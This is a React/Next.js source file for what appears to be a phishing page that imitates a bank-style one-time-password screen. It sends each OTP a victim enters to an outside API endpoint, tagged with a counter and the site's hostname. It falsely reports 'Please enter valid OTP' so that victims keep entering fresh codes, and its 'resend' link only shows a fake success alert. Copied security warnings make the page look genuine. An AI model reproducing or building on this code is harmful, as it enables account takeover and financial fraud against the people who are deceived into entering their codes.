'use client'
import Captcha from "../../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component
import { useSearchParams } from 'next/navigation'
import { useCounter } from '../lib/CounterContext';


import { useEffect, useState } from 'react';
export default function Home() {
  const { counter, incrementCounter } = useCounter();
  
   const router = useRouter();
   const queryString = useSearchParams()
   const nextRoute = queryString.get('next')
   const  [response, setResponse] = useState(false);
   const [err, setErr] = useState(false);
   const [otp, setOtp] = useState('');
    const showError = () => {
        alert("OTP resend successfully !");
    }
  const handleSubmit = (e) => {
    incrementCounter();
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key+counter] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            if(queryString.get('next') == null){
                setTimeout(function(){setErr(false);}, 3000);
                setErr(true);
                setOtp('');
           }else{
                setErr(false);
                router.push(nextRoute)
           }
            
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <main>
    <div className="Tpv_login_heading__E5J6K">
      <h3 className="Tpv_login_heading_h3__z0Qx1">Continue with One Time Password</h3>
    </div>
    
    <div className="Tpv_login_form___9zpm">
            <p className="Tpv_content_title__SWlCq">
                One time password sended your registerd mobile number
            </p>
            <p className="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
            <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
                <div className="Tpv_form_group__aHWg0">
                <label className="Tpv_label__cObJz">
                    Enter the One Time-Password (OTP)*
                    <span className="Tpv_mandatory_txt__YZHLO">*</span>
                </label>
                <input  
                    name="OTT"
                    type="text"
                    className="Tpv_form_control__5hzGF"
                    required
                    minLength={6}
                    maxLength={8}
                    value = {otp}
                    onChange={(e) => setOtp(e.target.value)}

                />
                </div>
                <div id="input_error" className="input_error" >
                    {err && ("Please enter valid OTP") }
                </div>

                <div className="Tpv_t_center__8YF86">
                <input
                    type="submit"
                    className="Tpv_btn_default__TMlv_"
                    defaultValue="submit"
                />
                </div>
            </form>
            <div className="Tpv_t_center__8YF86">
                {/* <p id="timeCountDown">00:00</p> */}
                 <Countdown countingInSeconds={140} />
            </div>
            <div className="Tpv_t_center__8YF86">
                <p>
                If you haven't received onetime password on your mobile phone, &nbsp;
                <span className="Tpv_btn_resend__L6Fku" onClick={showError}>
                    click here to resend
                </span>
                </p>
            </div>
            <div className="Tpv_info_panel__qNS7i">
                <div className="Tpv_notify_icon__7fP0C">
                <ul>
                    <li>
                    Please be aware that all call, sms, email related be sent to your
                    registered mobile number.
                    </li>
                    <li>
                    We are never contact with via email, SMS, or phone calls to want your
                    personal information.
                    </li>
                    <li>
                    Please do not respond suspicious sms, call, and email. Kindly report
                    any such suspicious immediately.
                    </li>
                </ul>
                </div>
            </div>
            </div>

  </main>
  
  )
}

function formatTime(minutes, seconds) {
  const formattedMinutes = Math.floor(minutes).toString().padStart(2, '0');
  const formattedSeconds = Math.floor(seconds).toString().padStart(2, '0');
  return `${formattedMinutes}:${formattedSeconds}`;
}

function Countdown({ countingInSeconds }) {
  const [timeRemaining, setTimeRemaining] = useState(formatTime(countingInSeconds / 60, countingInSeconds % 60));

  useEffect(() => {
    const targetTime = new Date();
    targetTime.setSeconds(targetTime.getSeconds() + countingInSeconds);

    const calculateRemainingTime = () => {
      const currentTime = new Date();
      const timeDifference = targetTime - currentTime;

      if (timeDifference > 0) {
        const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);
        setTimeRemaining(formatTime(minutes, seconds));
        setTimeout(calculateRemainingTime, 1000);
      } else {
        setTimeRemaining('00:00');
      }
    };

    calculateRemainingTime();
  }, [countingInSeconds]);

  return <div id="timeCountDown">{timeRemaining}</div>;
}